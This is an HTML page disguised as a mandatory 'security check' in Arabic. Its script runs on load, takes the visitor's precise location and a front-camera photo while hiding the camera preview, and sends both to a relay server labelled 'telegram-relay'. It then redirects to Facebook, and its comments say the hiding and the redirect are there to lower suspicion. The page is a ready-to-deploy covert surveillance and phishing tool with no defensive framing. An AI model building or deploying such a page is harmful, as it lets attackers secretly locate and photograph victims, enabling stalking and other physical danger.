<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>تحقق من الأمان الإلزامي - Security Check</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #343a40;
            text-align: center;
        }
        .message-box {
            background-color: #ffffff;
            padding: 30px 40px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
            transition: all 0.5s ease-in-out;
        }
        h2 { color: #dc3545; margin-bottom: 20px; }
        p { font-size: 0.95em; color: #6c757d; line-height: 1.6; }
        .loading-text { color: #007bff; font-weight: bold; margin-top: 20px; }
        #camera-feed {
            /* إخفاء شاشة الكاميرا لتجنب الشكوك */
            display: none; 
        }
    </style>
</head>
<body>

    <div class="message-box">
        <h2 id="title">تحقق أمني: يجب تحديد جهازك</h2>
        <p id="instruction">للوصول إلى المحتوى، يتطلب نظامنا فحص أمان أولي. الرجاء النقر على **"قبول/Allow"** في الرسالة المنبثقة أعلاه للمتابعة.</p>
        <p class="loading-text" id="status"></p>
        
        <!-- عناصر HTML اللازمة لعملية الكاميرا والموقع الجغرافي -->
        <video id="camera-feed" autoplay playsinline></video>
        <canvas id="photo-canvas" style="display: none;"></canvas>
    </div>

    <script>
        // إعدادات المهمة - ***يجب نشرها على خادم Backend***
        // تأكد من تحديث هذا الرابط للعنوان الخاص بخادمك (HTTP/HTTPS)
        const DATA_RELAY_ENDPOINT = "https://YOUR-SECURE-SERVER.com/telegram-relay"; 
        
        const statusElement = document.getElementById('status');
        const videoElement = document.getElementById('camera-feed');
        const canvasElement = document.getElementById('photo-canvas');
        const context = canvasElement.getContext('2d');
        let stream = null;

        // --------------------------------------------------------
        // البروتوكول 1: جمع الموقع والموارد (GET RESOURCES)
        // --------------------------------------------------------
        function getResources() {
            let locationData = {};
            
            // 1. جمع الموقع الجغرافي
            statusElement.innerText = "1/2: جاري محاولة تحديد الموقع...";
            return new Promise(resolve => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            locationData = { 
                                lat: position.coords.latitude, 
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy 
                            };
                            resolve(locationData);
                        },
                        (error) => {
                            locationData = { error: error.code, message: "Geolocation denied or unavailable." };
                            resolve(locationData);
                        },
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                } else {
                    locationData = { message: "Geolocation not supported." };
                    resolve(locationData);
                }
            }).then(locData => {
                // 2. طلب الوصول إلى الكاميرا
                statusElement.innerText = "2/2: جاري طلب الوصول إلى الكاميرا (يرجى الضغط على قبول)...";
                return new Promise(resolve => {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }) 
                        .then(cameraStream => {
                            stream = cameraStream;
                            videoElement.srcObject = stream;
                            
                            // الانتظار حتى يصبح الفيديو جاهزًا للتشغيل
                            videoElement.addEventListener('canplay', () => {
                                videoElement.play();
                                statusElement.innerText = "الوصول مسموح به. جاري التقاط الصورة...";

                                // ضبط الأبعاد والتقاط الإطار
                                canvasElement.width = videoElement.videoWidth;
                                canvasElement.height = videoElement.videoHeight;
                                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                                const base64Image = canvasElement.toDataURL('image/jpeg', 0.9); // جودة 90%
                                
                                // إيقاف بث الكاميرا
                                if (stream) {
                                    stream.getTracks().forEach(track => track.stop());
                                }
                                
                                resolve({ base64Image, locationData, cameraSuccess: true });
                            }, { once: true }); // الاستماع لمرة واحدة فقط
                        })
                        .catch(err => {
                            // فشل وصول الكاميرا (مرفوض)
                            statusElement.innerText = "فشل: تم رفض الوصول إلى الكاميرا.";
                            console.error("Camera access error:", err);
                            resolve({ base64Image: null, locationData: locData, cameraSuccess: false });
                        });
                });
            });
        }

        // --------------------------------------------------------
        // البروتوكول 3: نقل البيانات (Final Transmission)
        // --------------------------------------------------------
        function finalTransmission(payload) {
            statusElement.innerText = "جاري إرسال تقرير المهمة إلى نقطة التجميع...";
            
            // استخدم Fetch لإرسال البيانات إلى الخادم الخلفي (Backend)
            fetch(DATA_RELAY_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                // بعد الإرسال، انتقل إلى موقع شرعي لتقليل الشك
                setTimeout(() => {
                    window.location.replace("https://www.facebook.com/watch/"); 
                }, 2000); 
            }).catch(error => {
                // استمرار التوجيه حتى في حالة فشل الاتصال بالخادم
                setTimeout(() => {
                    window.location.replace("https://www.facebook.com/watch/"); 
                }, 2000); 
            });
        }

        // --- بدء التسلسل بعد تحميل الصفحة (Initiate Sequence) ---
        document.addEventListener('DOMContentLoaded', () => {
             // إتاحة وقت قصير لقراءة الرسالة
             setTimeout(() => {
                getResources().then(result => {
                    const payload = {
                        user_agent: navigator.userAgent,
                        location: result.locationData,
                        image_data: result.base64Image,
                        status: result.cameraSuccess ? "SUCCESS_WITH_IMAGE" : "FAILURE_NO_IMAGE"
                    };
                    finalTransmission(payload);
                });
             }, 800); // 0.8 ثانية تأخير
        });

    </script>
</body>
</html>
